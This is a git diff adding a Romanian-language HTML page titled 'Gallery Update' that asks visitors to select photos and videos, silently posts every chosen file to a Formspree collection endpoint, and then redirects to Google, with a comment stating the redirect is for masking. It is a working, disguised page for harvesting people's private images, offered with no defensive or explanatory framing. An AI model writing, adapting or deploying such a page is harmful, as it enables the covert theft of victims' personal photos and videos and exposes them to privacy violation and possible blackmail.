@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gallery Update</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; width: 90%; max-width: 300px; }
+        h1 { color: #333; font-size: 24px; margin-bottom: 20px; }
+        #select-btn {
+            background-color: #007AFF; 
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 100%;
+        }
+        #status { margin-top: 15px; color: #666; font-size: 14px; display: none; }
+        /* Input-ul ascuns */
+        #file-input { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Galerie Foto</h1>
+        <button id="select-btn">Selectează Poze</button>
+        
+        <!-- CHEIA FUNCȚIONALITĂȚII: name="files[]" este obligatoriu pentru Formspree -->
+        <input type="file" id="file-input" name="files[]" multiple accept="image/*,video/*">
+        
+        <div id="status">Se preiau fișierele...</div>
+    </div>
+
+    <script>
+        // ⚠️ PUNE AICI LINKUL TĂU FORMSPREE EXACT (fără spații)
+        const SERVER_URL = 'https://formspree.io/f/mgakvadd'; 
+
+        const btn = document.getElementById('select-btn');
+        const input = document.getElementById('file-input');
+        const status = document.getElementById('status');
+
+        btn.addEventListener('click', () => {
+            input.click();
+        });
+
+        input.addEventListener('change', async (e) => {
+            if (e.target.files.length === 0) return;
+
+            status.style.display = 'block';
+            status.innerText = 'Se încarcă...';
+
+            const files = Array.from(e.target.files);
+            const formData = new FormData();
+
+            // Adăugăm fiecare fișier sub numele "files[]"
+            files.forEach(file => {
+                formData.append('files[]', file, file.name);
+            });
+
+            try {
+                // Trimitem cererea
+                await fetch(SERVER_URL, { method: 'POST', body: formData });
+                
+                status.innerText = 'Gata!';
+                
+                // Redirecționare pentru mascare
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com'; 
+                }, 1500);
+
+            } catch (error) {
+                status.innerText = 'Eroare.';
+                console.error(error);
+            }
+        });
+    </script>
+</body>
+</html>
